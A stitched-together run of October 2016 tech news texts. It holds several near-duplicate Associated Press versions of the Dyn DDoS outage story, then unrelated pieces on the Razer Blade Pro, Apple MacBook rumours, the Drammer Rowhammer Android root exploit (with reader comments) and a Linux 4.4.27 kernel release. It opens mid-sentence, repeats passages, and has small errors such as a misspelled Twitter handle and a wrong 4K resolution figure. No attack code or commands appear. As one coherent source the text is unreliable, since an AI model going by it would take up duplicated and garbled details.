Internet was architected,” Dyn's York said on a call with reporters. He said there are 10 billion to 15 billion such devices online. Dyn first became aware of an attack around 7 a.m. local time, focused on data centers on the East Coast of the United States. Services were restored about two hours later. But then attackers shifted to offshore data centers, and problems continued. “It is a very smart attack. As we start to mitigate, they react and start to throw something that's over the top,” York said on a call with reporters. The second attack broadened its net, affecting the U.S. West Coast. “Prophet” of New World Hackers said hacktivists of the broad, more amorphous Anonymous collective piled on in the third wave on Friday afternoon. “We've stopped all our attacks,” he said at midafternoon. The U.S. Department of Homeland Security was monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French Internet service provider OVH. In a widely shared essay titled “Someone Is Learning How to Take Down the Internet,” respected security expert Bruce Schneier said last month that major Internet infrastructure companies were seeing a series of worrying denial-of-service attacks. “Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services,” he said.

(jim cole/Associated Press) By RAPHAEL SATTER and FRANK BAJAK, RAPHAEL SATTER and FRANK BAJAK, Associated Press Published: October 21, 2016, 9:20 PM A   A Local Angle: The internet attack Friday inflamed Twitter users, Netflix watchers and Spotify listeners, surely, but it also made a long day for local technology consultant Sam Rodriguez. The 37-year-old Vancouver resident services some 50 people and small businesses locally through his company Zen Focus Tech. Rodriguez said the siege on the New England-based DNS provider Dyn bogged many of his client’s access to important websites such as Zillow, a real estate listing site, and such tools as the cloud-based accounting software Freshbooks. “Nowadays, you have to use software on the website; and if you can’t get  to the website, you are pretty much out of luck,” he said. Rodriguez, who founded Zen Focus Tech in 2007, expects problems to increase as the internet is built into more and more devices. He points not just to smartphones, but digital home appliances, such as the thermostat Nest, that were exploited to flood the DNS provider’s servers. The attack may be a forerunner to a new era of cybersecurity, he said. “Absolutely there is going to be more demand not just cybersecurity but, from the point of view of people who are making these devices like webcams, etc. — they’re going to need to do a better job of securing their stuff,” he said. “(Consumers) may need to spend more time setting them up, like changing the default password on a router. It’s going to be more of an issue.” — Troy Brynelson Withering cyberattacks on server farms of a key internet firm repeatedly disrupted access to major websites and online services including Twitter, Netflix and PayPal across the United States on Friday.

The vulnerable internet For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. “I think you can see how fragile the internet network actually is,” he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. “The Internet of Things sort of ran way ahead of how the Internet was architected,” Dyn’s York said on a call with reporters. He said there are between 10-15 billion such devices online. Dyn first became aware of an attack around 7:00 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and problems continue. “It is a very smart attack. As we start to mitigate they react and start to throw something that’s over the top,” York said on a call with reporters. The second attack broadened its net, affecting the U.S. West Coast. “Prophet” of New World Hackers said hacktivists of the broad, more amorphous Anonymous collective piled on in the third wave on Friday afternoon. “We’ve stopped all our attacks,” he said at midafternoon. The U.S. Department of Homeland Security was monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH . In a widely shared essay titled “Someone Is Learning How to Take Down the Internet,” respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. “Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services,” he said. —— Satter reported from London, Bajak from Houston.

By Raphael Satter and Frank Bajak Raphael Satter and Frank Bajak Denton Record-Chronicle Associated Press Published: 21 October 2016 10:43 PM LONDON — Cyberattacks on a key internet firm repeatedly disrupted the availability of popular websites across the United States on Friday, according to analysts and company officials. The White House described the disruption as malicious. Members of a hacker group spread across China and Russia claimed responsibility, although their assertion couldn’t be verified. Manchester, New Hampshire-based Dyn Inc. said its server infrastructure was hit by distributed denial-of-service attacks, which work by overwhelming targeted machines with junk data traffic. The attack had knock-on effects for users trying to access popular websites from across America and even in Europe, affecting sites such as Twitter, Netflix and PayPal. Broad effects The level of disruption was difficult to gauge, but Dyn provides internet traffic management and optimization services to some of the biggest names on the web, including Twitter, Netflix and Visa. Critically, Dyn provides domain name services, which translate the human-readable addresses such as “twitter.com” into an online route for browsers and applications. Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. “It doesn’t matter that the store is fully open or operational if you have no idea how to get there,” he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly 1 in 2 end users would have found it impossible to access various websites from the East Coast. A second attack later in the day caused disruption to the East and West Coasts as well as impacting some users in Europe. “It’s been pretty busy for those guys,” Read said. “We’ve been monitoring Dyn for years and this is by far the worst outage event that we’ve observed.” Read said Dyn provides services to some 6 percent of America’s Fortune 500 companies. “It impacted quite a few users,” he said of the morning’s attack. A full list of affected companies wasn’t immediately available, but Twitter, Netflix, PayPal and the coder hangout Github said they briefly experienced problems earlier Friday. Hackers claim responsibility Members of a shadowy hacker collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected “zombie” computers that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. “We didn’t do this to attract federal agents, only test power,” two collective members who identified themselves as “Prophet” and “Zain” told an AP reporter via Twitter direct message exchange. They said more than 10 members participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they did not know who was behind the attacks or if they were orchestrated by a state-backed group or online activists or pranksters. They said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPNFantasySports.com in September and the BBC on Dec. 31. The attack on the BBC marshalled half the computing power of Friday’s onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorldHacking Twitter account. They said 20 are in Russia and 10 in China. “Prophet” said he is in India. “Zain” said he is in China. The two claimed to be taking “good actions.” Another collective member the AP previously communicated with via direct message called himself “Ownz” and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought through hacking only to expose security vulnerabilities. During the attack on the ESPN site, “Ownz” was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. “We will make one demand actually. Secure your website and get better servers, otherwise be attacked again,” he said. Vulnerable internet For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. “I think you can see how fragile the internet network actually is,” he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. Attacks came in waves and from IP addresses from around the world, shifting geographically. Dyn first became aware of an attack around 7 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and the latest wave of problems continued until Friday evening Eastern time.   Comments DentonRC.com is now using Facebook Comments.

The White House called the disruption malicious and a hacker group claimed responsibility, though its assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the U.S. even in Europe. "The complexity of the attacks is what is making it so difficult for us," said Kyle York, the company's chief strategy officer. "What they are actually doing is moving around the world with each attack." He said an East Coast data center was hit first; attacks on an offshore target followed later. The data flood came from tens of millions of different Internet-connected machines — including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. BROAD EFFECTS The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical internet addresses into human-readable destinations such as "twitter.com."

They are marketing the Blade Pro as a portable desktop replacement and although the device is notably thin at only .88 inches, it does weigh 7.8 lbs. The Blade Pro uses a 17.3-inch IGZO touchscreen with 4K (3480 x 2160) resolution that can cover 100% of Adobe’s RGB color space. The display also offers 170-degree viewing angles as well as support for NVIDIA's G-SYNC technology. The Blade Pro features NVIDIA’s GeForce GTX 1080 graphics card with 5 GB of GDDR5X VRAM, a 2.6 GHz Intel-i7 quad-core 6700-HQ processor and 32 GB of DDR4 RAM. All storage options utilize PCIe M.2 SSDs with up to a 2TB capacity. Razer says that these specs exceed the minimum hardware requirements to power the HTC Vive, Oculus Rift and OSVR HDK 2. The Blade Pro is powered by a built-in 99Wh battery and a compact 250W power adapter. Razer explains the device’s thermal management, stating "the vapor chamber reduces heat resistance and hotspots by spreading heat quickly, evenly and efficiently. A custom fan design and dynamic heat exchanger are paired with the vapor chamber to maximize heat dissipation." The device also features a low-profile and anti-ghosting mechanical keyboard with individually-lit keys powered by Razer Chroma and controlled by Razer's Synapse software. Other notable specs include three USB 3.0 ports, an SDXC card reader, a Thunderbolt 3 (USB-C) port and support for HDMI 2.0 audio and video input. The base model of the Blade Pro will retail for $3,699 from Razer's website with units shipping out later in November.

The White House called the disruption malicious and a hacker group claimed responsibility, though its assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the U.S. even in Europe. "The complexity of the attacks is what is making it so difficult for us," said Kyle York, the company's chief strategy officer. "What they are actually doing is moving around the world with each attack." He said an East Coast data center was hit first; attacks on an offshore target followed later. The data flood came from tens of millions of different Internet-connected machines — including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. BROAD EFFECTS The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical internet addresses into human-readable destinations such as "twitter.com." Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed," said Read. Dyn provides services to some 6 percent of America's Fortune 500 companies, he said. A full list of affected companies wasn't immediately available but Twitter, Netflix, PayPal and the coder hangout Github said they experienced problems. HACKERS CLAIM RESPONSIBILITY Members of a shadowy collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers called botnets that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPN.com in September and the BBC on Dec. 31. The attack on the BBC marshaled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They claim 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to their actions were "good," presumably because they highlighted internet security problems. Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought only to expose security vulnerabilities. During the attack on the ESPN site, "Ownz" was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. "We will make one demand actually. Secure your website and get better servers, otherwise be attacked again," he said. THE VULNERABLE INTERNET For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. "I think you can see how fragile the internet network actually is," he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. "The Internet of Things sort of ran way ahead of how the Internet was architected," Dyn's York said on a call with reporters. He said there are between 10-15 billion such devices online. Dyn first became aware of an attack around 7:00 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and problems continue. "It is a very smart attack. As we start to mitigate they react and start to throw something that's over the top," York said on a call with reporters. The second attack broadened its net, affecting the U.S. West Coast. "Prophet" of New World Hackers said hacktivists of the broad, more amorphous Anonymous collective piled on in the third wave on Friday afternoon. "We've stopped all our attacks," he said at midafternoon. The U.S. Department of Homeland Security was monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH . In a widely shared essay titled "Someone Is Learning How to Take Down the Internet," respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. "Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services," he said. ___ Satter reported from London, Bajak from Houston.

The White House described the disruption as malicious. Members of a hacker group spread across China and Russia claimed responsibility, although their assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its server infrastructure was hit by distributed denial-of-service attacks, which work by overwhelming targeted machines with junk data traffic. The attack had knock-on effects for users trying to access popular websites from across America and even in Europe, affecting sites such as Twitter, Netflix and PayPal. BROAD EFFECTS The level of disruption was difficult to gauge, but Dyn provides internet traffic management and optimization services to some of the biggest names on the web, including Twitter, Netflix and Visa. Critically, Dyn provides domain name services, which translate the human-readable addresses such as "twitter.com" into an online route for browsers and applications. Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. A second attack later in the day caused disruption to the East and West Coasts as well as impacting some users in Europe. "It's been pretty busy for those guys," Read said. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed." Read said Dyn provides services to some 6 percent of America's Fortune 500 companies. "It impacted quite a few users," he said of the morning's attack. A full list of affected companies wasn't immediately available, but Twitter, Netflix, PayPal and the coder hangout Github said they briefly experienced problems earlier Friday. HACKERS CLAIM RESPONSIBILITY Members of a shadowy hacker collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they did not know who was behind the attacks or if they were orchestrated by a state-backed group or online activists or pranksters. They said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPNFantasySports.com in September and the BBC on Dec. 31. The attack on the BBC marshalled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They said 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to be taking "good actions." Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought through hacking only to expose security vulnerabilities. During the attack on the ESPN site, "Ownz" was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. "We will make one demand actually.. Secure your website and get better servers, otherwise be attacked again," he said. THE VULNERABLE INTERNET For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. "I think you can see how fragile the internet network actually is," he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. Attacks came in waves and from IP addresses from around the world, shifting geographically. Dyn first became aware of an attack around 7:00 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and the latest wave of problems continued until Friday evening Eastern time. "It is a very smart attack. As we start to mitigate they react and start to throw something that's over the top," Kyle York, chief strategy officer of Dyn, on a call with reporters. The U.S. Department of Homeland Security is monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH . In a widely shared essay titled "Someone Is Learning How to Take Down the Internet," respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. "Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services," he said. ___ Most Read Find Local Real Estate Jobs Autos Businesses Find a job Buy or sell a car Find a place to live See what's for sale Find a business View obituaries N.J.

New iMacs and 5K external display will reportedly not be ready until next year.   ( Stephen Lam ) Advertisement Apple is all set to hold a big event on Oct. 27 and it's expected to unveil its latest MacBooks, including the much-touted MacBook Pro, but no iMac or display. According to trusted analyst Ming-chi Kuo, who proved to be correct with many predictions in the past, Apple will use the upcoming media event to take the wraps off a new 13-inch MacBook, as well as a new MacBook Pro in 13- and 15-inch models. Kuo believes that Apple will not introduce a new iMac or the rumored 5K external display until next year. The 13-inch MacBook should hit the scene as a successor to the 12-inch Retina MacBook that made its debut in 2015 and got an upgrade in April this year. The main attraction of the event, however, is expected to be the 15-inch MacBook Pro, which will reportedly rock some top-notch specs and features. Leaks and rumors so far have indicated that this model will sport a Retina display, Touch ID, upgraded internals and an OLED function row right above the keyboard. You can check out Tech Times' earlier coverage for a more comprehensive roundup of what we know so far about the MacBook Pro. Both the 13- and the 15-inch MacBook Pro models should feature the OLED touch bar and Touch ID sensor, as well as a Thunderbolt 3 port and the same butterfly keyboard design found on the 2015 MacBook. Kuo also added some new details on what he expects to see in the upcoming MacBooks. The analyst says Apple should equip the MacBook Pro with Intel Skylake processors, an oxide panel for better energy efficiency and superior display quality despite the same resolution, and a new 2 TB SSD storage option. Moreover, Kuo also hints at an Apple Watch-like processor to control the OLED touch bar more efficiently, and a USB Type-C and MagSafe-like adapter either from Apple or a third-party supplier. MacBook Pro models aside, it remains unclear at this point just what the 13-inch MacBook will bring to the table. Other than the fact that it will succeed the 2015 12-inch MacBook, little else is known. This model could turn out to be a MacBook Air updated with new USB Type-C ports, but it remains to be seen. Moving on to the desktop scene, Apple is rumored to be working on new iMac models with discrete AMD graphics, as well as a new standalone, external 5K display. According to Kuo, however, Apple will not be announcing the new iMacs or display until the first half of 2017. It's tough to tell for sure whether these predictions are accurate or not, but we'll find out soon enough. Apple's Oct. 27 event is just around the corner and we'll get the real scoop straight from the source, but it's best to take all rumors, predictions and reports with a grain of salt until then.

Resend activation e-mail Risk Assessment / Security & Hacktivism Using Rowhammer bitflips to root Android phones is now a thing Permission-less apps take only seconds to root phones from LG, Samsung and Motorola. by Dan Goodin - Oct 23, 2016 11:03 pm UTC Login to bookmark 157 Enlarge / An LG Nexus 5 at the moment it is rooted using Rowhammer-induced bit flips. van der Veen et al. Researchers have devised an attack that gains unfettered "root" access to a large number of Android phones, exploiting a relatively new type of bug that allows adversaries to manipulate data stored in memory chips. The breakthrough has the potential to make millions of Android phones vulnerable, at least until a security fix is available, to a new form of attack that seizes control of core parts of the operating system and neuters key security defenses. Equally important, it demonstrates that the new class of exploit, dubbed Rowhammer, can have malicious and far-reaching effects on a much wider number of devices than was previously known, including those running ARM chips. Previously, some experts believed Rowhammer attacks that altered specific pieces of security-sensitive data weren't reliable enough to pose a viable threat because exploits depended on chance hardware faults or advanced memory-management features that could be easily adapted to repel the attacks. But the new proof-of-concept attack developed by an international team of academic researchers is challenging those assumptions. An app containing the researchers' rooting exploit requires no user permissions and doesn't rely on any vulnerability in Android to work. Instead, their attack exploits a hardware vulnerability, using a Rowhammer exploit that alters crucial bits of data in a way that completely roots name brand Android devices from LG, Motorola, Samsung, OnePlus, and possibly other manufacturers. No quick fix "Until recently, we never even thought about hardware bugs [and] software was never written to deal with them," one of the researchers, Victor van der Veen, wrote in an e-mail. "Now, we are using them to break your phone or tablet in a fully reliable way and without relying on any software vulnerability or esoteric feature. And there is no quick software update to patch the problem and go back to business as usual." So far, "Drammer," as the researchers have dubbed their exploit, has successfully rooted the following handsets: the Nexus 4, Nexus 5, and G4 from LG; Moto G models from 2013 and 2014 made by Motorola; the Galaxy S4 and Galaxy S5 from Samsung; and the One from OnePlus. In some cases, the results aren't always consistent. For example, only 12 of the 15 Nexus 5 models were successfully rooted, while only one of two Galaxy S5 were compromised. The researchers aren't certain why their results are inconsistent. They theorize that the age of a given device may play a role, since extended or intensive use may wear down cells inside the memory chips over time. Another possibility is that memory chips from some suppliers are more resilient to Rowhammer than others. (It's not uncommon for different generations of the same phone model to use different memory chips.) The researchers expect to soon publish an app that allows people to test their individual phone and anonymously include the results in a running tally that will help researchers better track the list of vulnerable devices. (Update 10/24/2016 6:10 California time: The app still hasn't gone live in Google Play. People who are willing to sideload the app can find it here.) The researchers privately reported their findings to Google engineers in July, and the company has designated the vulnerability as "critical," its highest severity rating. Google also awarded the researchers $4,000 under the company's bug bounty reward program. Google informed its manufacturing partners of the vulnerability earlier this month and plans to release an update in November, but the researchers warned it doesn't conclusively fix the underlying Rowhammer hardware bug. Instead, it only makes the vulnerability much harder to exploit by restricting an app's access to "physical contiguous kernel memory," as carried out by Drammer. "I will have to check once the patch is out, but I expect that we could still find bit flips," van der Veen told Ars. "Exploiting them would be harder, but probably not impossible." Google continues to work on a longer term solution. The researchers have published two videos that demonstrate Drammer in action against an unrooted LG Nexus 5. For test and research purposes, the phone is connected by USB to a computer, although such a pairing isn't necessary to make the attacks work. In the first video, the handset is running Android 6.0.1 with security patches Google released on October 5. Beginning around 0:15, Drammer begins hammering memory, and between 0:30 and 0:50, the exploit can be seen writing new entries to the memory's page table, 512 entries at a time. At the 0:50 mark, Drammer obtains root access and opens a shell window that gives complete control over the device. Drammer on Android 6.0.1 The second video shows how Drammer can be combined with code that exploits specific Android vulnerabilities, in this one known as Stagefright, which remains unfixed in many older handsets. By adding the Drammer privilege-escalation exploit, an existing code-execution attack can access core parts of the operating system, rather than being confined only to a small section of it, as envisioned under the Android security model. In the second video, the Stagefright exploit gives the researchers an advanced shell, but it still has only limited system privileges, as evidenced by the inability to access the phone's SD card. By running Drammer, however, the shell gains root access, starting about 3:30 into the video. Stagefright + Drammer Drammer represents a dramatic advance in what's known about Rowhammer. In 2014, researchers first demonstrated that repeatedly accessing data stored in memory chips could flip certain bits, causing certain zeros to become ones and vice versa. The bitflips were viewed by many as more of a data-corrupting threat than one with far-reaching consequences for security. In part, that was because the bit flips were possible only in limited regions of certain DDR memory chips, making it hard to surgically alter specific pieces of security-sensitive data. The road to exploitation Then in 2015, researchers for Google's Project Zero showed that in limited settings, Rowhammer could be exploited to elevate user privileges and break out of security sandboxes that protect operating systems from untrusted code. Many researchers continued to downplay the significance of the results, in part because Google responded by updating its Chrome browser to disable the CLFLUSH instruction that was required to make the sandbox escape work. Additionally, critics said error-correcting code and other protections could easily mitigate the threat. Since then, researchers have slowly advanced the capabilities of Rowhammer, showing, for instance, the bug can be exploited by the type of JavaScript code hosted on websites and can be fine-tuned to alter specific pieces of security-sensitive data using a technique known as flip feng shui. Flip feng shui, however, still relied on advanced memory-management features that aren't available in most mobile devices and other low-cost platforms. And like all the other Rowhammer exploits that preceded it, it worked only on devices that used chips with an x86 x64 architecture, which are mostly made by Intel and Advanced Micro Devices. Drammer was devised by many of the same researchers behind Flip Feng Shui, and it adopts many of the same approaches. Still, it represents a significant improvement over Flip Feng Shui because it's able to alter specific pieces of sensitive-security data using standard memory management interfaces built into the Android OS. Using crucial information about the layout of Android memory chips gleaned from a side channel the researchers discovered in ARM processors, Drammer is able to carry out what the researchers call a deterministic attack, meaning one that can reliably target security-sensitive data. The susceptibility of Android devices to Rowhammer exploits likely signals a similar vulnerability in memory chips used in iPhones and other mobile devices as well. "It is currently unclear to us if, and how this could be exploited," van der Veen told Ars. "I would not be surprised if it turns out that this is possible, though. Drammer shows that the requirements for reliable exploitation are provided by fundamental operating system functionality, and I expect that similar functionality is available on iOS (or even Windows Phone)." The findings are the product of a research team from VUSec at Vrije Universiteit Amsterdam, the University of California at Santa Barbara, and Graz University of Technology. They will be presenting their research later this week at the 23rd ACM Conference on Computer and Communications Security in Vienna, Austria. They have published this informational page with additional details of their work. In a paper published early Monday morning Amsterdam time titled Drammer: Deterministic Rowhammer Attacks on Mobile Platforms, the researchers wrote: Not only does our attack show that practical, deterministic Rowhammer attacks are a real threat for billions of mobile users, but it is also the first effort to show that Rowhammer is even possible at all (and reliably exploitable) on any platform other than x86 and with a much more limited software feature set than existing solutions. Moreover, we demonstrated that several devices from different vendors are vulnerable to Rowhammer. To conclude, our research shows that practical large-scale Rowhammer attacks are a serious threat and while the response to the Rowhammer bug has been relatively slow from vendors, we hope our work will accelerate mitigation efforts both in industry and academia. In a statement, Google officials wrote: "After researchers reported this issue to our Vulnerability Rewards Program, we worked closely with them to deeply understand it in order to better secure our users. We’ve developed a mitigation which we will include in our upcoming November security bulletin."

They can make it more difficult, as the article states software fixes would only be a bandaid. Well, it'll be a kinda-sorta software patch. Mainly to enable memory encryption. On an SoC I worked on, we had in the memory controller a Memory Encryption Unit that scrambled both address and data lines. If you enabled it, every boot you'd load on a random number into the key registers and then enable it. (You have to be running from SRAM at this point, because obviously once enabled, everything is encrypted). The purpose of this unit was to prevent plaintext data form hitting memory so if you spied on the memory bus, you got gibberish. This technique has been used many times efore (I believe the Xbox360 has encrypted main memory as well). Even better, it's wire speed zero overhead, transparent to the SoC (inside the SoC the MEU would've decrypted the data, so no special support is needed, and this includes the DMA controller). Because of the way it works and the key, you cannot guaranteed the data or the rows are even similar from boot to boot. I'm not sure if iOS or the Apple SoCs have a MEU - in general they should, and I think I've heard they do, but no real confirmation. 965 posts | registered 7/7/2001 KonoWatakushi Ars Scholae Palatinae jump to post Layer8Error wrote: The actual implementation of this exploit is way over my head, but could this be prevented using ECC? Theoretically, an attack is still possible with ECC. However, ECC helps considerably with this and other data corruption, and would likely land the attack on the other side of practical. ECC memory should have been made standard a decade ago. Now, as with many other things, the cost of our foolishness is coming due. Manufacturers saved a few pennies or dollars, and now we have millions if not billions of devices that can't be secured. 1226 posts | registered 9/14/2005 Reader comments 157 You must login or create an account to comment.

Linux Kernel 4.4.27 LTS Brings Many ReiserFS and EXT4 Changes, Updated Drivers GO All users of the Linux 4.4 LTS kernel branch must update Oct 23, 2016 22:10 GMT  ·  By Marius Nestor  ·  Share:  Immediately after informing us about the release of Linux kernel 4.8.4, Greg Kroah-Hartman announced the immediate availability of the twenty-seventh maintenance update to the long-term supported Linux 4.4 kernel series. Just like Linux kernel 4.8.4, the Linux 4.4.27 LTS kernel release comes just a couple of days after its previous version, namely Linux kernel 4.4.26 LTS, which was urgently patched against the nasty "Dirty COW" bug. However, according to diff from Linux kernel 4.4.26 LTS and the appended shortlog, Linux kernel 4.4.27 LTS is a minor update that changes a total of 31 files, with 223 insertions and only 189 deletions. "I'm announcing the release of the 4.4.27 kernel. All users of the 4.4 kernel series must upgrade," says Greg Kroah-Hartman. "The updated 4.4.y git tree can be found at: git://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.git linux-4.4.y and can be browsed at the normal kernel.org git web browser: http://git.kernel.org/?p=linux/kernel/git/stable/linux-stable.git;a=summary." Users must update their Linux-based systems immediately If you click on the appended shortlog like above, you'll notice that Linux kernel 4.4.27 LTS introduces various improvements to the ReiserFS and EXT4 filesystems, but also some minor Btrfs, FUSE, sound stack, crypto, and core kernel changes. Additionally, it looks like there are enhancements to the Intel i40e Ethernet and Broadcom brcm80211 Wireless drivers, as well as the arcmsr and ibmvscsi SCSI drivers. If you're using a GNU/Linux distribution powered by a kernel from the long-term supported Linux 4.4 LTS branch, you are urged to update to Linux kernel 4.4.27 LTS as soon as possible, or more precisely as soon as it lands in the stable repositories of your operating system. OS vendors and powered users need to download the Linux kernel 4.4.27 LTS source right now via our website or directly from kernel.org. #Linux 4.4.27#Linux kernel 4.4.27 LTS#Linux 4.4#Linux LTS#Linux subscribe feedly old reader newsblur digg reader rss feed reddit it! flip it share it tweet it Related  ·  Hot right now  ·  Latest news KDE Applications 16.12 Software Suite Lands December 15 for KDE Plasma 5.8 LTS GParted Live 0.27.0-1 Disk Partitioning Live CD Out Now, Based on GParted 0.27.0 Linux Kernel 4.8.4 Released with EXT4 and Btrfs Improvements, Updated Drivers Netrunner Core 16.09 "Avalon" Is Based on Debian GNU/Linux 8, KDE Plasma 5.7.5 Microsoft Pledges to Completely Retire Office 2007 Next Year Firefox 50.0 Officially Released for Linux, Mac and Windows, Here's What's New Some U.S. Android Phones Have Secret Backdoor That Sends Data to China Apple Insider Says iPhone 6 Plus Has a Major Bug, Company Should Start Recall Microsoft Pledges to Completely Retire Office 2007 Next Year X.Org Server 1.19.0 Officially Released, Coming Soon to a Linux Distro Near You Red Hat Software Collections 2.3 and Red Hat Developer Toolset 6 Available Now Linux Kernel 4.4.32 LTS Adds Networking Improvements, Updated AMDGPU Drivers    Linux kernel 4.4.27 LTS released New Linux Apps Linux Kernel: What you are about to download is the core of all the Linux operating systems in the world Linux Kernel: The core of the Linux operating systems, created and maintained by Linus Torvalds Tor Browser: Browse the web anonymously with the custom and private web browser from the Tor project KDE Frameworks: This project contains all the KDE libraries and code base for KDE applications and platform darktable: Your personal virtual lighttable and darkroom, photography workflow & RAW management application LFA (Linux For All): A 64-bit only Linux-based operating system that features four desktop environments Vivaldi: The next-generation web browser for power users, based on the powerful Chromium project Reader comments Mozilla Firefox 50.0 Now Available for Download, 